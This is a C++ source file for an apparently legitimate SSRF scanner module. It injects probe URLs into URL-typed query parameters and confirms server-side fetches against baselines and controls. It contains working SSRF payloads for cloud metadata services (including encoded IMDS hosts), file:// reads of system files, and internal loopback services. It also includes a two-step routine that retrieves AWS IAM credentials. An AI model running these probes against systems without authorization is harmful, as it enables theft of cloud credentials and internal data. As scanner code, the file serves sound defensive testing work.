#include "ssrf_scan.hpp"
#include "networking.hpp"

#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Core::SsrfScan {

namespace {

// The bogus path segment used to build a "shaped control": a same-host /
// same-scheme URL that points at a resource that cannot exist. A genuine
// server-side fetch returns the real resource for the probe URL and a
// not-found for the control; an error/WAF/echo template keyed on the URL
// SHAPE (the file:// scheme, the 169.254.x.x host) returns the same content
// for both, so the signature showing up on the control means the match was
// input-correlated noise, not a fetch.
const char *kControlTag = "nullock-ssrf-zq9x1k7p";

// A probe is { the URL to make the server fetch, a same-shape non-fetchable
// control URL, a signature that lives in the FETCHED resource but never in the
// URL string itself, and the finding it maps to }. The "not in the URL"
// property defeats reflection; the control defeats input-shape correlation;
// the baseline-absence check defeats signatures the page always serves.
// Matching is CASE-SENSITIVE (these tokens have a fixed case in the real
// resource) and JSON-key signatures are quoted to stay specific.
struct Probe {
    const char *url;
    const char *control;
    const char *signature;
    const char *technique;
    const char *severity;
    const char *kind;
};

const Probe kProbes[] = {
    // AWS IMDS instance metadata listing. Three host encodings that most HTTP
    // stacks resolve to the same 169.254.169.254, so a denylist that only
    // string-matches the canonical dotted-quad is still caught.
    { "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/nullock-ssrf-zq9x1k7p/",
      "ami-id", "aws-imds-v1", "critical", "ssrf-cloud-metadata" },
    { "http://2852039166/latest/meta-data/",
      "http://2852039166/nullock-ssrf-zq9x1k7p/",
      "ami-id", "aws-imds-decimal", "critical", "ssrf-cloud-metadata" },
    { "http://0xA9FEA9FE/latest/meta-data/",
      "http://0xA9FEA9FE/nullock-ssrf-zq9x1k7p/",
      "ami-id", "aws-imds-hex", "critical", "ssrf-cloud-metadata" },
    // Alibaba Cloud metadata.
    { "http://100.100.100.200/latest/meta-data/",
      "http://100.100.100.200/nullock-ssrf-zq9x1k7p/",
      "ami-id", "aliyun-imds", "critical", "ssrf-cloud-metadata" },
    // Azure / GCP need a request header the SSRF can't inject, so they often
    // 403 -- a miss (signature absent), never a false positive. The JSON-key
    // signatures are quoted to avoid matching the same field name in ordinary
    // (e.g. Azure-SDK) error envelopes.
    { "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "http://169.254.169.254/metadata/nullock-ssrf-zq9x1k7p?api-version=2021-02-01",
      "\"subscriptionId\"", "azure-imds", "critical", "ssrf-cloud-metadata" },
    { "http://metadata.google.internal/computeMetadata/v1/instance/",
      "http://metadata.google.internal/computeMetadata/v1/nullock-ssrf-zq9x1k7p/",
      "service-accounts", "gcp-metadata", "critical", "ssrf-cloud-metadata" },
    // Local file disclosure via the file:// scheme.
    { "file:///etc/passwd",
      "file:///etc/nullock-ssrf-zq9x1k7p",
      "root:x:0:0:", "file-unix-passwd", "high", "ssrf-internal" },
    { "file:///c:/windows/win.ini",
      "file:///c:/windows/nullock-ssrf-zq9x1k7p.ini",
      "16-bit app support", "file-win-ini", "high", "ssrf-internal" },
    // Internal services on loopback that emit a stable, response-only banner.
    { "http://127.0.0.1:9200/",
      "http://127.0.0.1:9200/nullock-ssrf-zq9x1k7p",
      "\"cluster_name\"", "internal-elasticsearch", "high", "ssrf-internal" },
    { "http://127.0.0.1:8080/actuator",
      "http://127.0.0.1:8080/nullock-ssrf-zq9x1k7p",
      "\"_links\"", "internal-spring-actuator", "high", "ssrf-internal" },
    { "http://127.0.0.1:2375/version",
      "http://127.0.0.1:2375/nullock-ssrf-zq9x1k7p",
      "\"ApiVersion\"", "internal-docker", "high", "ssrf-internal" },
    { "http://127.0.0.1:8500/v1/agent/self",
      "http://127.0.0.1:8500/nullock-ssrf-zq9x1k7p",
      "\"Consul\"", "internal-consul", "high", "ssrf-internal" },
};

QByteArray buildRequest(const Request &req, const QString &query) {
    // Request-line injection guard: the method and path are written into the
    // request line raw, so a CR/LF in either would inject a header/line.
    if (req.method.contains('\r') || req.method.contains('\n')) return {};
    if (req.basePath.contains('\r') || req.basePath.contains('\n')) return {};

    const QString target = query.isEmpty() ? req.basePath : req.basePath + "?" + query;
    QByteArray out;
    out  = req.method.toUtf8() + " " + target.toUtf8() + " HTTP/1.1\r\n";
    out += "Host: " + req.host.toUtf8() + "\r\n";
    out += "User-Agent: Nullock/ssrf\r\n";
    out += "Accept: */*\r\n";
    out += "Accept-Encoding: identity\r\n";
    for (const auto &h : req.headers) {
        if (h.first.compare("Host", Qt::CaseInsensitive) == 0) continue;
        if (h.first.compare("Content-Length", Qt::CaseInsensitive) == 0) continue;
        if (h.first.contains('\r') || h.first.contains('\n')) continue;
        if (h.second.contains('\r') || h.second.contains('\n')) continue;
        out += h.first.toUtf8() + ": " + h.second.toUtf8() + "\r\n";
    }
    out += "Connection: close\r\n\r\n";
    return out;
}

} // namespace

QStringList knownSsrfParams() {
    // URL-typed sink names only -- generic search/short names (q, query, r, ...)
    // are deliberately excluded: auto-detect picks the first match and stops,
    // so a non-sink name would steal the probe budget from the real sink.
    return { "url", "uri", "target", "targeturl", "dest", "dest_url",
             "destination", "redirect", "redirect_uri", "redirect_url",
             "return", "returnurl", "return_url", "callback", "callback_url",
             "webhook", "feed", "rss", "atom", "image", "image_url", "imageurl",
             "avatar", "avatar_url", "logo", "thumb", "thumbnail", "preview",
             "path", "file", "link", "src", "source", "sourceurl", "host",
             "hostname", "address", "addr", "domain", "site", "page", "fetch",
             "load", "proxy", "next", "continue", "data", "reference", "ref",
             "out", "to", "view", "show", "goto", "forward", "forward_url",
             "origin", "remote", "resource", "document", "wsdl", "xsl",
             "upload", "endpoint", "server", "u", "uri_ref" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    // Resolve which parameter to inject into.
    QUrlQuery q(req.query);
    if (req.param.isEmpty()) {
        const QStringList known = knownSsrfParams();
        for (const auto &kv : q.queryItems())
            if (known.contains(kv.first.toLower())) { req.param = kv.first; break; }
        if (req.param.isEmpty()) {
            result.error = "no SSRF-prone parameter given or auto-detected in the query";
            return result;
        }
    }
    result.testedParam = req.param;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto sendWith = [&](const QString &value) {
        QUrlQuery qq(req.query);
        qq.removeAllQueryItems(req.param);
        qq.addQueryItem(req.param, value);
        ++result.requestsSent;
        return client.send(req.host, port, req.tls,
                           buildRequest(req, qq.toString(QUrl::FullyEncoded)));
    };
    auto bodyOf = [](const HttpClient::SendResult &r) {
        return QString::fromUtf8(r.parsed.body.left(256 * 1024));
    };

    // Baseline with a benign, non-fetchable token (not a URL): its body fixes
    // which signatures the target serves unconditionally.
    const auto baseResp = sendWith(QStringLiteral("nullock-ssrf-baseline"));
    if (!baseResp.ok) {
        result.error = "baseline failed: " + baseResp.errorMessage;
        return result;
    }
    result.baselineStatus = baseResp.parsed.statusCode;
    const QString baseBody = bodyOf(baseResp);

    auto confirm = [&](const Probe &p) {
        const QString sig = QString::fromLatin1(p.signature);
        if (baseBody.contains(sig)) return;             // served unconditionally
        const auto r = sendWith(QString::fromLatin1(p.url));
        if (!r.ok || !bodyOf(r).contains(sig)) return;  // not fetched / not present
        // Shaped control: a same-shape, non-fetchable sibling. If the signature
        // is here too, it tracks the input shape (error/WAF/echo template), not
        // a fetch -- suppress to keep the finding fetch-proven.
        const auto c = sendWith(QString::fromLatin1(p.control));
        if (c.ok && bodyOf(c).contains(sig)) return;
        result.hits.append({ QString::fromLatin1(p.technique),
                             QString::fromLatin1(p.url), sig,
                             QString::fromLatin1(p.severity),
                             QString::fromLatin1(p.kind), req.param });
        result.vulnerable = true;
    };

    for (const Probe &p : kProbes) confirm(p);

    // AWS IMDS IAM credentials need a two-step fetch: the listing path returns
    // only the attached ROLE NAME; the credential document (with AccessKeyId)
    // lives one level deeper at .../security-credentials/<role>.
    {
        const QString listUrl =
            QStringLiteral("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
        const QString sig = QStringLiteral("\"AccessKeyId\"");
        if (!baseBody.contains(sig)) {
            const auto roleResp = sendWith(listUrl);
            if (roleResp.ok) {
                const QString role = bodyOf(roleResp).trimmed().section('\n', 0, 0).trimmed();
                const bool roleLike = !role.isEmpty() && role.size() <= 128
                    && !role.contains(' ') && !role.contains('<') && !role.contains('{');
                if (roleLike && !bodyOf(roleResp).contains(sig)) {
                    const auto credResp = sendWith(listUrl + role);
                    if (credResp.ok && bodyOf(credResp).contains(sig)) {
                        const auto ctl = sendWith(listUrl + kControlTag + "-norole");
                        if (!(ctl.ok && bodyOf(ctl).contains(sig))) {
                            result.hits.append({ QStringLiteral("aws-imds-iam"),
                                                 listUrl + role, sig,
                                                 QStringLiteral("critical"),
                                                 QStringLiteral("ssrf-cloud-metadata"),
                                                 req.param });
                            result.vulnerable = true;
                        }
                    }
                }
            }
        }
    }

    return result;
}

} // namespace Nullock::Core::SsrfScan
